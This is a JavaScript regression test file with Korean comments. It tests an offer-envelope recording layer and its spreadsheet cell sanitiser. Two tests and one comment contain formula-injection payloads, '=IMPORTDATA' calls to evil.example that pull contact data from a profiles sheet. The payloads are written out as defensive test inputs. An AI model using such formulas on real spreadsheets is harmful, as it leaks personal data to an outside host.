'use strict';
/* 제안 봉투 회귀 — 2026-09-08 (판매 설계 §⑥ 걸음 5 · 심문 A2)
 *
 * 무엇을 지키나: **「그때 무엇을 약속했나」를 되짚을 수 있는가.**
 *   제안 한 건마다 가격·보장 문안 판·환불 조건 판·잔여 정원·제안 시각·받은 사람을 남긴다.
 *   그 뒤 값이나 문안이 바뀌어도 이미 보낸 제안은 이 봉투로 판정된다.
 *
 * 🔴 이 시험은 «소스의 그 코드»를 돌린다 — 09-08 에 환불 비율 시험이 복사본을 돌리다
 *   배포 검수에 잡혔다(키 5a0cd71f810f). 같은 실수를 두 번 하지 않는다.
 *   가짜 시트 하나만 물려 실제 함수를 태운다.
 */
const { test } = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const path = require('node:path');

const REPO = path.resolve(__dirname, '..');
const 소스 = fs.readFileSync(path.join(REPO, '엔진_진단.js'), 'utf8');

/* 소스에서 상수와 함수 셋을 떼어 낸다. */
function 봉투층뽑기() {
  const 상수시작 = 소스.indexOf("const OFFER_TAB_ = '제안봉투';");
  assert.ok(상수시작 > 0, '제안 봉투 상수가 소스에 없다');
  const 상수끝 = 소스.indexOf('\n', 소스.indexOf('OFFER_TERMS_VER', 상수시작));
  const 함수시작 = 소스.indexOf('function 제안봉투시트_(ss) {');
  assert.ok(함수시작 > 0, '제안봉투시트_ 가 소스에 없다');
  const 함수끝 = 소스.indexOf('\n}', 소스.indexOf('function 제안봉투상태_', 함수시작));
  assert.ok(함수끝 > 함수시작, '제안봉투상태_ 의 끝을 못 찾았다');
  return 소스.slice(상수시작, 상수끝) + '\n' + 소스.slice(함수시작, 함수끝 + 2);
}

/* 가짜 시트 — appendRow 로 쌓이고 setValue 로 한 칸이 바뀌는 것만 흉내낸다. */
function 판만들기() {
  const rows = [];
  const sh = {
    getLastRow: () => rows.length + 1,
    getRange: (r, c, n, w) => ({
      getValues: () => rows.slice(r - 2, r - 2 + (n || rows.length)),
      setValue: (v) => { rows[r - 2][c - 1] = v; },
    }),
    appendRow: (row) => rows.push(row.slice()),
  };
  const 판 = {
    rows,
    ensureSheet: () => sh,
    SpreadsheetApp: { getActiveSpreadsheet: () => ({ getSpreadsheetTimeZone: () => 'Asia/Seoul' }) },
    Utilities: {
      formatDate: (d, tz, f) => (f.indexOf('ss') >= 0 ? '2026-09-08 09:00:00'
        : f.indexOf('HHmmss') >= 0 ? '20260908-090000' : '2026-09-08 09:00'),
    },
    SYNK_VERSION: 'v9.332',
    /* 🔴 [09-08] **가짜가 실물보다 너그러우면 그 시험은 거짓 초록을 낸다.**
     *   앞 판의 가짜 `행소독_` 은 배열이 아니면 낱개로 소독해 줬는데, 실물(Code.js:1129)은
     *   `rows.map(...)` 을 그냥 부른다 — 낱개 글자를 주면 `rows.map is not a function` 으로 죽는다.
     *   그래서 「결제 열쇠를 소독해 쓴다」가 시험에서는 초록인데 라이브에서는 **한 번도 안 돌았다**
     *   (배포 검수의 보안 층이 09-08 에 잡았다 · 시험 셋이 다 초록이던 자리다).
     *   ⇒ 이제 가짜도 실물처럼 **배열만** 받는다. 낱개 칸은 실물과 같은 이름(`셀안전_`)으로 따로 준다. */
    행소독_: (rows) => {
      if (!Array.isArray(rows)) throw new TypeError('rows.map is not a function');
      const cell = (v) => (typeof v === 'string' && /^[=+\-@\t\r]/.test(v) ? "'" + v : v);
      return rows.map((r) => (Array.isArray(r) ? r.map(cell) : cell(r)));
    },
    /* 실물 = 상담AI.js 의 셀안전_(v) — 낱개 칸 하나를 소독한다. */
    셀안전_: (v) => {
      const s = String(v == null ? '' : v);
      return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
    },
  };
  const 층 = 봉투층뽑기();
  const f = new Function('ensureSheet', 'SpreadsheetApp', 'Utilities', 'SYNK_VERSION', '행소독_', '셀안전_',
    층 + '\nreturn { 만들기: 제안봉투만들기_, 상태: 제안봉투상태_, 칸: 봉투칸_, 판이름: OFFER_TERMS_VER, 헤더: OFFER_HEADERS };');
  판.api = f(판.ensureSheet, 판.SpreadsheetApp, 판.Utilities, 판.SYNK_VERSION, 판.행소독_, 판.셀안전_);
  return 판;
}

test('[v9.332] ① 봉투가 그때 조건 일곱을 남긴다', () => {
  const 판 = 판만들기();
  const r = 판.api.만들기({ 세션번호: 'S1', 진단코드: 'D1', 학생번호: '', 가격: 15, 잔여정원: 9 });
  assert.strictEqual(r.ok, true);
  assert.match(r.봉투번호, /^OF-/);
  const row = 판.rows[0];
  const 칸 = 판.api.칸;
  assert.strictEqual(row[칸('가격')], 15, '가격이 안 남았다');
  assert.strictEqual(row[칸('잔여정원')], 9, '잔여 정원이 안 남았다');
  assert.ok(row[칸('제안시각')], '제안 시각이 비었다');
  assert.ok(row[칸('보장문안판')], '보장 문안 판이 비었다');
  assert.ok(row[칸('환불조건판')], '환불 조건 판이 비었다');
  assert.strictEqual(row[칸('상태')], '보냄');
  assert.strictEqual(row[칸('엔진판')], 'v9.332', '어느 판에서 보낸 제안인지 안 남았다');
});

test('[v9.332] ② 두 번 눌러도 봉투는 하나다 (같은 세션 · 보냄)', () => {
  const 판 = 판만들기();
  const a = 판.api.만들기({ 세션번호: 'S1', 가격: 15, 잔여정원: 9 });
  const b = 판.api.만들기({ 세션번호: 'S1', 가격: 15, 잔여정원: 8 });
  assert.strictEqual(b.이미있음, true, '같은 세션에 봉투가 둘이 되면 「그때 약속」이 두 개가 된다');
  assert.strictEqual(b.봉투번호, a.봉투번호);
  assert.strictEqual(판.rows.length, 1);
});

test('[v9.332] ③ 빈 봉투를 안 만든다 — 가격·잔여 정원이 없으면 거절', () => {
  const 판 = 판만들기();
  assert.strictEqual(판.api.만들기({ 세션번호: 'S1', 잔여정원: 9 }).error, 'no-price');
  assert.strictEqual(판.api.만들기({ 세션번호: 'S1', 가격: 15 }).error, 'no-seats');
  assert.strictEqual(판.api.만들기({ 가격: 15, 잔여정원: 9 }).error, 'no-key', '누구에게 보낸 제안인지 없으면 못 만든다');
  assert.strictEqual(판.rows.length, 0);
});

test('[v9.332] ④ 결제와 취소가 봉투에 이어진다', () => {
  const 판 = 판만들기();
  const a = 판.api.만들기({ 세션번호: 'S1', 가격: 15, 잔여정원: 9 });
  assert.strictEqual(판.api.상태(a.봉투번호, '수락', 'PAY-77').ok, true);
  const 칸 = 판.api.칸;
  assert.strictEqual(판.rows[0][칸('상태')], '수락');
  assert.strictEqual(판.rows[0][칸('결제열쇠')], 'PAY-77');
});

test('[v9.332] ⑤ 이미 수락된 봉투를 다시 수락으로 덮지 않는다', () => {
  const 판 = 판만들기();
  const a = 판.api.만들기({ 세션번호: 'S1', 가격: 15, 잔여정원: 9 });
  판.api.상태(a.봉투번호, '수락', 'PAY-77');
  const r = 판.api.상태(a.봉투번호, '수락', '');
  assert.strictEqual(r.그대로, true, '덮으면 결제 열쇠가 지워진다');
  assert.strictEqual(판.rows[0][판.api.칸('결제열쇠')], 'PAY-77');
});

test('[v9.332] ⑥ 모르는 상태·모르는 봉투는 거절한다', () => {
  const 판 = 판만들기();
  const a = 판.api.만들기({ 세션번호: 'S1', 가격: 15, 잔여정원: 9 });
  assert.strictEqual(판.api.상태(a.봉투번호, '아무거나').error, 'bad-state');
  assert.strictEqual(판.api.상태('OF-없음', '수락').error, 'no-envelope');
});

test('[v9.332] ⑧ 시트 소독 통로를 지난다 — 수식으로 시작하는 글이 그대로 안 들어간다', () => {
  /* 🔴 보안 검토 09-08: 이 스프레드시트에 profiles(학생·보호자 연락처)가 함께 산다.
   *   `=IMPORTDATA("...?d="&TEXTJOIN(",",1,profiles!B2:B60))` 한 줄이 셀에 들어가면
   *   사람이 클릭하지 않아도 시트가 스스로 평가해 개인정보가 밖으로 나간다. */
  assert.ok(/sh\.appendRow\(행소독_\(/.test(소스), '봉투 기입이 소독 통로를 안 지난다');
  /* 🔑 09-08 에 이 줄이 «행» 소독기를 못 박고 있었다. 실물은 배열만 받으므로 낱개 칸에 쓰면
   *   그 자리에서 죽는다 — 못 박은 글자가 실행되지 않는 코드를 지키고 있었던 것이다.
   *   낱개 칸의 정본은 `셀안전_`(상담AI.js)이다. */
  assert.ok(/setValue\(셀안전_\(String\(결제열쇠\)\)\)/.test(소스), '결제 열쇠 기입이 소독 통로를 안 지난다');

  const 판 = 판만들기();
  const 공격 = '=IMPORTDATA("https://evil.example/?d="&TEXTJOIN(",",1,profiles!B2:B60))';
  판.api.만들기({ 세션번호: 공격, 가격: 15, 잔여정원: 9 });
  const 셀 = 판.rows[0][판.api.칸('세션번호')];
  assert.notStrictEqual(셀[0], '=', '수식이 그대로 셀에 들어갔다 — 시트가 스스로 평가한다');
  assert.strictEqual(판.rows[0][판.api.칸('가격')], 15, '소독이 숫자까지 문자열로 바꾸면 안 된다');
});

test('[v9.332] ⑦ 판 이름이 박혀 있다 — 값·문안이 바뀌면 이 문자열도 오른다', () => {
  assert.match(소스, /OFFER_TERMS_VER = 'offer-t\d+-\d{4}-\d{2}-\d{2}'/,
    '그때 조건의 판 이름이 없으면 옛 봉투와 새 봉투를 못 가른다');
});

/* ────────────────────────────────────────────────────────────────────────────
 * [v9.336] 09-08 배포 검수가 잡은 둘 — 둘 다 «되짚을 바닥»을 무너뜨리는 자리다.
 * 소스의 그 함수를 그대로 태워서 잰다(글자 대조가 아니다).
 * ──────────────────────────────────────────────────────────────────────────── */

test('[v9.336] 🔴 P1 — 상태만 저장되고 결제 열쇠가 못 붙은 봉투는 «다시 보내면» 붙는다', () => {
  /* 무엇이 병이었나: 상태 저장과 열쇠 저장은 쓰기 «둘»이다. 앞이 되고 뒤가 실패하면
   *   그 봉투는 「수락」인데 열쇠가 빈 채로 남는데, 다시 보내도 「이미 수락」 조기 반환에
   *   걸려 다시는 안 붙었다. 결제가 어느 봉투 것인지 영영 못 되짚는다. */
  const 판 = 판만들기();
  const a = 판.api.만들기({ 세션번호: 'S-1', 가격: 15, 잔여정원: 9 });
  // ① 열쇠 없이 수락된다(뒤 쓰기가 실패한 자리를 그대로 흉내낸다)
  판.api.상태(a.봉투번호, '수락');
  assert.strictEqual(String(판.rows[0][판.api.칸('결제열쇠')] || ''), '', '준비가 틀렸다 — 열쇠가 이미 있다');
  // ② 같은 요청을 다시 보낸다 → 빈 자리가 채워져야 한다
  const b = 판.api.상태(a.봉투번호, '수락', 'PAY-77');
  assert.strictEqual(b.ok, true);
  assert.strictEqual(판.rows[0][판.api.칸('결제열쇠')], 'PAY-77',
    '이미 수락이라고 돌아가 버려서 결제 열쇠가 영영 안 붙는다');
});

test('[v9.336] 🔒 P1 짝 — 이미 붙어 있는 결제 열쇠는 덮지 않는다', () => {
  /* 위 고침이 「빈 자리만 채운다」를 넘어 «덮기»가 되면, 결제 하나가 다른 봉투로 옮겨 붙는다. */
  const 판 = 판만들기();
  const a = 판.api.만들기({ 세션번호: 'S-2', 가격: 15, 잔여정원: 9 });
  판.api.상태(a.봉투번호, '수락', 'PAY-첫것');
  판.api.상태(a.봉투번호, '수락', 'PAY-나중것');
  assert.strictEqual(판.rows[0][판.api.칸('결제열쇠')], 'PAY-첫것', '먼저 붙은 열쇠를 덮었다');
  // 상태를 바꾸는 갈래에서도 같다
  판.api.상태(a.봉투번호, '거절', 'PAY-또다른것');
  assert.strictEqual(판.rows[0][판.api.칸('결제열쇠')], 'PAY-첫것', '상태를 바꾸는 길로 덮였다');
});

test('[v9.336] 🔴 P2 — 「정원을 안 넘긴 것」과 「정원이 진짜 0」을 가른다', () => {
  /* Number('') · Number(null) · Number(' ') 은 전부 0 이다. 그래서 정원을 아예 안 넘긴 제안이
   *   「잔여 0」인 봉투로 앉아 «그때 조건»을 거짓으로 적었다. */
  const 판 = 판만들기();
  for (const 빈것 of ['', '   ', null, undefined]) {
    const r = 판.api.만들기({ 세션번호: 'S-3', 가격: 15, 잔여정원: 빈것 });
    assert.strictEqual(r.ok, false, '빈 잔여정원(' + JSON.stringify(빈것) + ')으로 봉투가 만들어졌다');
    assert.strictEqual(r.error, 'no-seats');
  }
  assert.strictEqual(판.rows.length, 0, '거절했는데 행이 쌓였다');

  // 숫자 0 은 «진짜 정원 0»이라 그대로 받는다(마감된 반의 제안도 남아야 한다)
  const ok = 판.api.만들기({ 세션번호: 'S-4', 가격: 15, 잔여정원: 0 });
  assert.strictEqual(ok.ok, true, '진짜 0 까지 막으면 마감된 반의 봉투를 못 남긴다');
  assert.strictEqual(판.rows[0][판.api.칸('잔여정원')], 0);

  // 숫자로 못 읽는 글도 거절한다
  const 나쁨 = 판.api.만들기({ 세션번호: 'S-5', 가격: 15, 잔여정원: '아홉' });
  assert.strictEqual(나쁨.ok, false, '숫자가 아닌 잔여정원이 통과했다');
});

test('[v9.336] 🔴 결제 열쇠 쓰기가 «실제로 돈다» — 낱개 칸은 낱개 소독기로 (09-08 보안 검토)', () => {
  /* 무엇이 병이었나: 낱개 글자를 «행» 소독기에 넣었다. 실물은 `rows.map(...)` 이라 그 자리에서
   *   던지고 멈춘다 — 결제 열쇠는 [v9.332] 이래 라이브에서 **한 번도 안 붙었다.**
   *   시험이 초록이었던 까닭은 가짜 소독기가 실물보다 너그러웠기 때문이다(위 판만들기 주석). */
  assert.ok(!/행소독_\(String\(결제열쇠\)\)/.test(소스),
    '낱개 칸을 행 소독기에 넣고 있다 — 그 줄은 실행되는 순간 죽는다');
  assert.ok(/셀안전_\(String\(결제열쇠\)\)/.test(소스), '결제 열쇠가 소독 통로를 안 지난다');

  const 판 = 판만들기();
  const a = 판.api.만들기({ 세션번호: 'S-6', 가격: 15, 잔여정원: 9 });
  판.api.상태(a.봉투번호, '수락', '=IMPORTDATA("https://evil.example/?d="&profiles!B2)');
  const 셀 = String(판.rows[0][판.api.칸('결제열쇠')]);
  assert.notStrictEqual(셀[0], '=', '수식이 그대로 앉았다 — 시트가 스스로 평가한다');
  assert.match(셀, /^'=IMPORTDATA/, '소독 통로를 지난 꼴이 아니다');
});
